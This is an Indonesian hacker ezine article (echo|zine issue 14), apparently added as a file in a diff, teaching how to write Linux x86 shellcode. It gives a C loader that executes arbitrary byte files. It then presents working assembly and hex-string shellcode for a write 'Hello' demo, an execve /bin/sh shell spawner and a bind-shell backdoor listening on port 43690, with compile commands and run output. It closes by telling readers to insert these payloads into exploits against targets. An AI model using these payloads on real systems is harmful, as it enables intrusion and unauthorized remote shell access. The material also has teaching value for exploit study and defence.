@@ -1,0 +1,592 @@
+
+
+                           echo|zine, issue 14
+
+------------------------------[ Shellcode ]-------------------------------
+--------------------------------------------------------------------------
+----------------------[ <cyb3rh3b[at]kecoak.or.id> ]----------------------
+
+
+---//  Intro
+
+Dalam dunia computer security, kata 'exploit' merupakan salah satu kata 
+yang paling sering digunakan dan dijumpai. Exploit seakan-akan seperti 
+senjata super yang dapat digunakan untuk membobol suatu sistem, 
+benarkah?! Yup, exploit memang dapat di ibaratkan sebagai suatu senjata 
+yang dapat digunakan untuk menyerang dan menjebol suatu sistem sehingga 
+kita bisa mendapatkan akses pada sistem tersebut. Prinsip dasar mengenai
+exploit telah di berikan oleh y3dips pada echo|zine 13, pada 
+ezine tersebut y3dips menggambarkan bagaimana proses pembuatan suatu 
+exploit berdasarkan informasi hole pada suatu sistem.
+
+Saat ini, ada cukup banyak jenis exploit yang dapat digunakan. Ada 
+exploit yang menyerang suatus sistem secara langsung dengan memanfaatkan
+security hole pada sistem tersebut (system based), dan ada juga exploit 
+yang digunakan untuk menyerang security hole pada suatu aplikasi web 
+(web based e[x]ploit). Ada sangat banyak cara menemukan hole security, 
+dan ada banyak juga jenis hole yang dapat di manfaatkan (sekali lagi, 
+silahkan baca artikel y3dips mengenai 0day exploit pada echo|zine 13).
+
+Diantara jenis hole tersebut, ada 1 jenis hole yang dapat dikatakan 
+sebagai jenis hole tertua dimana jenis hole tersebut digunakan sebagai 
+dasar pembuatan exploit bahkan hingga saat ini. Jenis hole tersebut 
+adalah 'buffer overflow', yang hingga saat ini masih menjadi salah 
+satu jenis hole tertua namun banyak di gunakan sebagai dasar menemukan
+kelemahan suatu sistem maupun aplikasi yang sifat nya system based. 
+Saya tidak akan menjelaskan secara rinci bagaimana cara kerja buffer 
+overflow, untuk memahami nya silahkan baca artikel buatan aleph1 
+yang berjudul "Smashing The Stack for Fun and Profit". 
+
+Dalam exploit yang memanfaatkan jenis hole buffer overflow, kita 
+pasti akan menemukan apa yang di sebut dengan "Shellcode". Umumnya 
+banyak yang tidak memahami apa itu shellcode, bagaimana cara membuatnya,
+bagaimana prinsip dasar cara kerja nya, dsb. Tapi yang pasti, shellcode
+berbentuk karakter-karakter aneh yang dimasukan dalam source code suatu
+exploit, dan saya yakin banyak sekali teman-teman yang penasaran dengan
+karakter-karakter aneh tersebut dan bertanya-tanya apa itu sebenarnya :).
+
+Oh iya, sebelum nya saya harap anda telah memahami prinsip dasar 
+bagaimana komputer bekerja khusus nya bagaimana suatu program berjalan 
+pada sebuah komputer, dengan kata lain anda memiliki pengetahuan dasar
+mengenai pemrograman tingkat rendah untuk memahami prinsip kerja shellcode,
+bagi anda yang belum memahami ada baik nya membaca-baca terlebih dahulu
+dasar-dasar pemrograman assembly baik pada linux maupun windows (secara
+prinsip sama aja kok :) ). So...here we go!
+
+
+---//  Shellcode
+
+Shellcode merupakan program yang akan mengambil alih suatu sistem sesaat
+setelah exploit membuat sistem tersebut 'crash'. Shellcode dapat 
+diibaratkan seperti telur yang di bungkus oleh exploit, saat exploit 
+berhasil merusak suatu sistem maka telur yang ada didalamnya akan segera
+mengambil alih sistem tersebut. Dalam prinsip dasar cara kerja komputer,
+prosesor hanya akan melakukan 1 buah instruksi dalam satu waktu. Yang
+memberikan instruksi tersebut adalah program (contoh program: winamp, 
+notepad, dsb). Saat program akan di eksekusi (misal: kita klik icon 
+winamp), maka program winamp yang semula ada di hardisk akan diload ke 
+suatu lokasi di memori komputer, dan kemudian prosesor akan mengeksekusi
+kode-kode program winamp tersebut. Dalam hal ini kita membicarakan 
+program tingkat rendah (bahasa mesin), program akan memberikan instruksi
+kepada prosesor untuk mendapatkan suatu hasil tertentu, sebagai contoh
+menuliskan karakter tertentu pada monitor.
+
+Lalu apa yang sebenar nya dilakukan exploit?!exploit akan membuat suatu
+aplikasi/sistem yang memiliki kelemahan tertentu 'crash' dan memboikot
+aplikasi tersebut sehingga  prosesor yang seharus nya menjalankan 
+kode-kode program aplikasi tadi akan diarahkan untuk menjalankan 
+kode-kode lain yang telah di persiapkan oleh exploit. Yup, kode-kode 
+yang telah di persiapkan tersebut adalah shellcode.
+
+Saat exploit merusak suatu aplikasi/sistem, exploit akan menempatkan 
+shellcode di suatu lokasi memori pada mesin target, selanjut nya exploit 
+akan membuat prosesor menuju lokasi memori tempat shellcode telah ditanam 
+dan kemudian akan mengeksekusi nya. Mekanisme ini berhubungan langsung 
+dengan prosesor dan memory, itu sebab nya shellcode dibuat agar dapat 
+langsung di tanam pada memori sehingga bentuk nya cukup aneh.
+
+Berikut contoh shellcode:
+
+char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x0f\x59\xb3"
+                   "\x01\xb2\x0d\xb0\x04\xcd\x80\xfe\xcb\xb0\x01\xcd"
+                   "\x80\xe8\xec\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c"
+                   "\x20\x77\x6f\x72\x6c\x64\x21";
+
+Bagi mereka yang sering kutak-katik exploit terutama dengan mempelajari 
+source codenya (bukan cuma menggunakan saja) pasti sering melihat bentuk
+diatas, dan saya yakin banyak yang bertanya-tanya apa itu sebenarnya :).
+
+Karakter-karakter diatas merupakan bentuk yang dapat langsung ditempakan 
+pada memory komputer, dan dapat segera di eksekusi oleh prosesor. Apabila 
+dieksekusi, shellcode diatas akan menginstruksikan prosesor untuk 
+menampilkan tulisan "Hello, World!" pada monitor (STDOUT).
+
+
+---//  Pembuatan Shellcode
+
+Dari penjelasan diatas, saya rasa cukup jelas ada nya pernyataan bahwa 
+shellcode adalah 'telur' yang di bawa oleh exploit untuk di eksekusi oleh
+target. Dengan kata lain, exploit akan memaksa mesin target melakukan suatu
+instruksi tertentu sesuai dengan jenis shellcode yang akan digunakan. 
+Diantara teman-teman mungkin pernah juga melihat pernyataan bahwa exploit 
+itu spesifik untuk suatu jenis mesin (platform) tertentu dan spesifik 
+untuk sistem operasi tertentu, misalnya: exploit untuk linux tidak dapat
+digunakan oleh windows. Kenapa?! karena tiap platform (misal: intel, sparc,
+mac) maupun sistem operasi (linux, freebsd, sun solaris) memiliki aturan
+standar tertentu untuk proses alokasi memory serta instruksi prosesornya.
+Dengan begitu, shellcode untuk suatu platform maupun sistem operasi 
+tertentu tentu akan berbeda dengan platform dan sistem operasi lain nya.
+
+Dari penjelasan tentang shellcode diatas, dapat dipahami mengapa suatu 
+mesin yang telah diexploit bisa kita dapat kan shell nya...ataupun dapat
+melakukan serangan DOS tertentu terhadap mesin lain, ataupun setelah di
+exploit tiba-tiba mesin target akan membuka port tertentu dimana kita bisa
+masuk ke sistem tersebut melalui port yang baru saja dibuka, dsb. Itu 
+semua tergantung dari jenis shellcode yang kita gunakan terhadap mesin 
+target. Namun untuk membuat exploit tidak semudah membicarakan nya, harus
+dilakukan percobaan terlebih dahulu untuk mengetahui bagaimana cara membuat
+sistem tersebut crash, bagaimana cara kita meletakan shellcode pada memory 
+mesin target sesaat setelah aplikasi/sistem nya 'crash', dsb.
+
+Untuk proses pembuatan exploit di luar cakupan bahasan saat ini (karena 
+terlalu luas, may be next article :) ). Saat ini, kita hanya akan bahas 
+proses membuat shellcode dan apa saja hal-hal penting yang harus 
+diperhatikan saat membuat shellcode tersebut.
+
+
+---//  Tools
+
+Untuk membuat shellcode, minimal harus memiliki pengetahuan dasar mengenai
+bahasa pemrograman tingkat rendah (assembly), bahasa C, system call dan
+pemrograman jaringan. Untuk artikel ini saya menggunakan sistem operasi 
+linux (backtrack), nasm, serta gcc yang semuanya berjalan di atas kernel
+linux-2.6.12.2 dan seluruh code program yang digunakan sebagai contoh 
+telah diujicoba sebelumnya.
+
+Untuk proses kompilasi shellcode, akan digunakan tools opensource "nasm". 
+nasm digunakan untuk kompilasi kode assembly sehingga dapat di konversi 
+dalam bentuk string dan digunakan dalam exploit. Paket nasm juga 
+menyertakan disassembler yang dapat digunakan untuk disassemble compiled
+shellcode. 
+
+Shellcode yang telah di compile harus diubah terlebih dahulu dalam bentuk
+string hexadecimal (hex string) seperti contoh diatas (yang bentuknya aneh
+=D). Untuk proses eksekusi shellcode yan telah di compile maupun 
+mengubahnya dalam bentuk hex string kita dapat menggunakan program dibawah
+ini:
+
+[Cyb3rh3b@k-elektronik] $ cat s-proc.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+/*
+ * Print message function
+ */
+static void
+croack (const char *msg) {
+	fprintf(stderr, "%s\n",msg);
+	fflush(stderr);
+}
+/*
+ * Usage function
+ */
+static void
+usage (const char *prgnam) {
+	fprintf(stderr, "\nExecute code : %s -e <file-containing-shellcode>\n",prgnam);
+	fprintf(stderr, "Convert code : %s -p <file-containing-shellcode> \n\n",prgnam);
+	fflush(stderr);
+	exit(1);
+}
+/*
+ * Signal error and bail out.
+ */
+static void
+barf(const char *msg) {
+	perror(msg);
+	exit(1);
+}
+
+/*
+ * Main code starts here
+ */
+
+int 
+main(int argc, char **argv) {
+	FILE		*fp;
+	void		*code;
+	int		arg;
+	int		i;
+	int		l;
+	int 		m = 15; /* max # of bytes to print on one line */
+
+	struct stat sbuf;
+	long	flen;		/*	Note: assume files are < 2**32 bytes long ;-) */
+	void		(*fptr)(void);
+
+	if (argc < 3) usage (argv[0]);
+	if (stat(argv[2],&sbuf)) barf("failed to stat file");
+	flen = (long) sbuf.st_size;
+	if (!(code = malloc(flen))) barf("failed to grab required memory");
+	if (!(fp = fopen(argv[2], "rb"))) barf("failed to open file");
+	if (fread(code,1,flen,fp) != flen) barf("failed to slurp file");
+	if (fclose(fp)) barf("failed to close file");
+	
+	while ((arg = getopt(argc,argv,"e:p:")) != -1) {
+		switch(arg) {
+			case 'e':
+				croack("Calling code ...");
+				fptr = (void (*)(void)) code;
+				(*fptr)();
+				break;
+			case 'p':
+				printf("\n/* The following shellcode is %d bytes long: */\n",flen);
+				printf("\nchar shellcode[] = \n");
+				l = m;
+				for (i=0;i < flen; ++i) {
+					if (1 >= m) {
+						if (i) printf("\"\n");
+						printf( "\t\"");
+						l=0;
+					}
+					++l;
+					printf("\\x%02x", ((unsigned char *)code) [i]);
+				}
+				printf("\";\n\n\n");
+				
+				break;
+			default :
+				usage(argv[0]);
+		}
+	}
+	return 0;
+}
+
+
+[Cyb3rh3b@k-elektronik] $ gcc s-proc.c -o s-proc
+[Cyb3rh3b@k-elektronik] $ ./s-proc
+
+Execute code : ./s-proc -e <file-containing-shellcode>
+Convert code : ./s-proc -p <file-containing-shellcode>
+
+Compile source code tools tersebut dengan cara diatas, dan apabila 
+berhasil...coba tes apakah tools tersebut siap digunakan. Untuk mencoba
+shellcode yang akan dijadikan contoh pada artikel ini, lakukan langkah
+berikut:
+
+1. Tulis shellcode dalam bahasa assembly dan simpan dengan nama file .S, 
+   contoh: hello.S
+2. Lakukan kompilasi : nasm -o <filename-output> <filename-source>.S, 
+   contoh: nasm -o hello hello.S
+3. Untuk print shellcode gunakan: s-proc -p <filename>
+4. Untuk eksekusi shellcode gunakan: s-proc -e <filename>
+
+
+Ok, sekarang persiapan nya telah siap...segera kita lihat bagaimana cara
+membuat shellcode :)
+
+
+---//  Code, code, code!
+
+Saya harap anda telah memahami dari penjelasan sebelum nya bahwa shellcode
+merupakan kode program yang telah berbentuk string hexadecimal untuk di
+tempatkan pada suatu lokasi di memori target dan kemudian di eksekusi oleh
+prosesor mesin tersebut. Pada contoh-contoh dibawah ini hanya memberikan
+gambaran bagaimana membuat shellcode tesebut, bukan membuat exploit secara
+keseluruhan.
+
+Shellcode umum nya memanfaatkan system call, diantara system call tersebut
+yang terpenting dan banyak digunakan adalah write dan execve. Berikut contoh
+shellcode yang memanfaatkan system call write (yang ditulis dalam bahasa C 
+dan assembly):
+
+[Cyb3rh3b@k-elektronik] $ cat write.c
+
+#include <stdio.h>
+
+int main()
+{
+	char *str="Hello, echo!!";
+	
+	write(1,str,13);
+	exit(1);
+	return 0;
+	
+}
+
+[Cyb3rh3b@k-elektronik] $ gcc write.c -o write
+[Cyb3rh3b@k-elektronik] $ ./write
+Hello, echo!!
+
+program diatas apabila diconvert ke dalam bahasa assembly (jangan lupa, shellcode dibuat menggunakan bahasa tingkat rendah seperti assembly) 
+sebagai berikut:
+
+
+[Cyb3rh3b@k-elektronik] $ cat write.S
+
+BITS 32
+
+xor             eax,eax
+xor             ebx,ebx
+xor             ecx,ecx
+xor             edx,edx
+jmp short       string
+code:
+pop             ecx
+mov            bl,1
+mov            dl,13
+mov            al,4
+int               0x80
+dec             bl
+mov            al,1
+int               0x80
+string:
+call            code
+db              'Hello, echo!!'
+
+compile source code diatas dan eksekusi dengan menggunakan tools s-proc:
+
+[Cyb3rh3b@k-elektronik] $ nasm -o write write.S
+[Cyb3rh3b@k-elektronik] $ s-proc -e write
+Calling code ...
+Hello, echo!!
+
+program/shellcode diatas memanfaatkan system call write untuk menampilkan 
+tulisan "Hello, echo!!" di layar monitor, informasi lengkap mengenai system
+call pada linux dapat dicari melalui internet, ada cukup banyak situs yang
+menyediakan list system call serta penggunaan nya pada bahasa assembly (itu
+sebab nya diatas tadi saya harap anda telah membaca mengenai pemrograman
+assembly, khusus nya pada linux :) ). Dengan tools s-proc tersebut, kita 
+bisa mendapatkan bentuk hex string dari shellcode yang telah di compile:
+
+[Cyb3rh3b@k-elektronik] $ s-proc -p write
+/* The following shellcode is 43 bytes long: */
+
+char shellcode[] =
+\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x0f\x59\xb3\x01\xb2\x0d\xb0\x04\xcd\x80\xfe\xcb\xb0\x01\xcd\x80\xe8\xec\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x65\x63\x68\x6f\x21\x21";
+
+hex string diatas dapat kita gunakan sebagai telur pada exploit, dan tentu 
+saja apabila di gunakan pada suatu exploit...maka setelah proses eksploitasi 
+mesin target akan menampilkan tulisan "Hello, echo!!" pada screen nya 
+(STDOUT) :).
+
+
+Selain system call write, yang umum digunakan adalah system call execve. 
+Berikut contoh implementasi nya dalam bahasa C yang kemudian diconvert 
+kedalam bahasa assembly:
+
+[Cyb3rh3b@k-elektronik] $ cat execve.c
+
+#include <stdio.h>
+
+int main()
+{
+
+	char *command="/bin/sh";
+	char *args[2];
+	
+	args[0]=command;
+	args[1]=0;
+	
+	execve(command,args,0);
+	
+	return 0;
+	
+}
+
+program diatas memanfaatkan system call execve untuk meng-eksekusi command 
+"/bin/sh", dengan kata lain untuk membangkitkan shell pada sistem linux/unix. 
+Berikut ini adalah hasil konversi nya dalam bahasa assembly:
+
+[Cyb3rh3b@k-elektronik] $ cat execve.S
+
+BITS 32
+xor		eax,eax
+cdq
+push	eax
+push	long	0x68732f2f
+push	long	0x6e69622f
+mov	ebx,esp
+push	eax
+push	ebx
+mov	ecx,esp
+mov	al,0x0b
+int		0x80
+
+[Cyb3rh3b@k-elektronik] $ nasm -o execve execve.S
+[Cyb3rh3b@k-elektronik] $ s-proc -e execve
+Calling code ...
+sh-3.00#  
+
+shellcode tersebut akan di eksekusi mesin target, biasa nya digunakan untuk 
+membangkitkan shell seperti pada local exploit (mendapatkan shell root pada 
+target). Untuk menjadikan shellcode diatas sebagai telur yang siap di 
+bawa/dibungkus oleh exploit, kita harus mengubah nya dalam bentuk hex 
+string...untuk itu gunakan lagi tools s-proc:
+
+[Cyb3rh3b@k-elektronik] $ s-proc -p execve
+/* The following shellcode is 24 bytes long: */
+
+char shellcode[] =
+\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+
+That's it, bentuk hex string diatas lah yang akan kita masukan pada 
+exploit :). 
+
+Shellcode yang digunakan pada exploit saat ini umum nya memanfaatkan system 
+call networking, sehingga mesin target dapat di akses secara remote. 
+Misalnya: shellcode untuk membuat mesin target membuka port tertentu dimana
+telah disiapkan shell untuk penyerang apabila melakukan koneksi pada port 
+tersebut, atau bahkan membuat mesin target melemparkan shellnya kepada 
+penyerang secara langsung sehingga saat proses exploitasi selesai penyerang
+akan mendapatkan akses shell ke mesin target. 
+
+Berikut ini salah satu contoh shellcode yang memanfaatkan pemrograman 
+jaringan, dimana shellcode akan membuat mesin target membuka suatu port dan 
+mengeksekusi shell ketika seseorang melakukan koneksi pada port tersebut. 
+Jadi, pada dasar nya shellcode ini merupakan backdoor pada remote system:
+
+[Cyb3rh3b@k-elektronik] $ cat bindshell.c
+
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int soc,cli;
+struct sockaddr_in serv_addr;
+
+int main()
+{
+
+	serv_addr.sin_family=2;
+	serv_addr.sin_addr.s_addr=0;
+	serv_addr.sin_port=0xAAAA;
+	soc=socket(2,1,0);
+	bind(soc,(struct sockaddr *)&serv_addr,0x10);
+	listen(soc,1);
+	cli=accept(soc,0,0);
+	dup2(cli,0);
+	dup2(cli,1);
+	dup2(cli,2);
+	execve("/bin/sh",0,0);
+
+	return 0;
+	
+}
+
+apabila di konversi ke dalam assembly maka program diatas akan menjadi:
+
+[Cyb3rh3b@k-elektronik] $ cat bindshell.S
+
+BITS 32
+
+xor 		eax,eax
+xor 		ebx,ebx
+cdq
+		
+push 	eax
+push 	byte 	0x1
+push 	byte 	0x2
+mov	ecx,esp
+inc		bl
+mov	al,102
+int		0x80
+mov	esi,eax	; store the return value in esi
+
+push	edx
+push	long	0xAAAA02AA
+mov	ecx,esp
+push	byte	0x10
+push	ecx
+push	esi
+mov	ecx,esp
+inc		bl
+mov	al,102
+int		0x80
+
+push	edx
+push	esi
+mov	ecx,esp
+mov	bl,0x4
+mov	al,102
+int		0x80
+
+push	edx
+push	edx
+push	esi
+mov	ecx,esp
+inc		bl
+mov	al,102
+int		0x80
+mov	ebx,eax
+
+xor		ecx,ecx
+mov	cl,3
+l00p:
+dec		cl
+mov	al,63
+int		0x80
+jnz		l00p
+
+push	edx
+push	long	0x68732f2f
+push	long	0x6e69622f
+mov	ebx,esp
+push	edx
+push	ebx
+mov	ecx,esp
+mov	al,0x0b
+int		0x80
+
+
+[Cyb3rh3b@k-elektronik] $ nasm -o bindshell bindshell.S
+[Cyb3rh3b@k-elektronik] # s-proc -e bindshell
+Calling code ...
+
+Shellcode diatas akan membuka port 43690 saat di eksekusi, untuk melihatnya 
+bisa dilihat dengan utility netstat:
+
+[Cyb3rh3b@k-elektronik] $ netstat -lt
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0             *:43690                               *:*                        LISTEN
+tcp        0      0             *:x11                                    *:*                        LISTEN
+
+
+Dan seperti biasa, untuk mendapatkan bentuk hex string dari shellcode 
+bindshell diatas kita tinggal menggunakan tools s-proc:
+
+[Cyb3rh3b@k-elektronik] $ s-proc -p bindshell
+/* The following shellcode is 96 bytes long: */
+
+char shellcode[] =
+\x31\xc0\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc6\x52\x68\xaa\x02\xaa\xaa\x89\xe1\x6a\x10\x51\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+
+Selanjutnya tinggal memasukan shellcode dalam bentuk hex string diatas dalam 
+exploit kita untuk dieksekusi oleh target :).
+
+
+---//  Summary
+
+Artikel ini saya buat mengingat kebingungan saya saat awal-awal membaca source 
+code exploit dulu, dan diantara teman-teman juga mungkin ada yang sempat 
+bingung dengan fungsi shellcode pada saat membaca source code exploit. 
+Intinya, shellcode merupakan program yang dibawa oleh exploit dan akan 
+dieksekusi oleh target. Shellcode merupakan instruksi langsung yang akan 
+ditempatkan pada memori,itu sebab nya harus dalam bentuk hex string. Dan pada
+artikel ini telah di berikan contoh bagaimana mendapatkan hex string dari
+shellcode yang dibuat menggunakan bahasa assembly. Semoga saja dapat 
+memberikan gambara pada teman-teman mengenai shellcode dan bagaimana dasar 
+cara membuat nya. Untuk referensi lebih dalam mungkin bisa di coba untuk 
+membaca artikel nya aleph1 tentang buffer overflow dan artikel mengenai cara 
+pembuatan exploit.
+
+Semog bermanfaat.
+
+Wassalam!
+
+
+---//  Reference
+
+	1. Smashing The Stack For Fun and Profit - Aleph1
+	2. Writing Security Tools and Exploits - James C. Foster ; Vincent Liu
+	3. 0second: Meet The Bugs - y3dips
+
+
+---// Shoutz
+
+	1. All my familly et Computer 'n Communication Laboratory STT Telkom
+	  [freak, q-ball, suro, etc...miz u guyz =P] & STTHackerlinkz community
+	  [TemON, silverant,malix,vaughn]
+	2. k-elektronik member [shoutz tu CyberTank, crasher, cbug and
+	   others...c'mon guyz, let's smash the hole for f*n again=P]
+	3. ECHO Staff [kapan kumpul2 di jakarta nih?!=D; @the_day, sorry to know
+	   that...please accept my deep condolences]
+	4. Ph03n1x, sakitjiwa,anomaly,SinChan, Javatype
+	5. #e-c-h-o;#k-elektronik;#unsecured;#antihackerlink;#neoteker @ DalNet
+	
